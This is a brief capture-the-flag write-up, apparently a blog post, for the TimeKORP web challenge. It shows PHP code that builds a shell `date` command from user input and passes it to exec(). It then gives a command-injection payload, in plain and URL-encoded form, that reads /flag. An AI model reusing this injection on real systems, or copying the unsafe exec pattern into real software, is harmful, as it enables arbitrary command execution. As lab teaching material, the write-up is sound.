---
title: TimeKORP 
date: 2023-12-10T13:37:49+02:00
author: 1byteBoy
tags:
  - Web
draft: false
---

```
TimeKORP 
```

In the provided downloadable source code file, the `TimeModel.php` file has some interesting piece of code

```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res  = isset($time) ? $time : '?';
        return $res;
    }
}
```

It seems it's executing the `date` os command as 

```bash
date '+"%Y-%m-%d %H:%M:%S"' 2>&1
```

This hence is vulnerable to OS command injection vulnerability. Where we can create a payload like

```bash
"'&&cat /flag # 
```

better to url encode it `"'%26%26cat+/flag+%23`, which will read the flag from `/flag`.

Note: we can know the path fromt he Dockerfile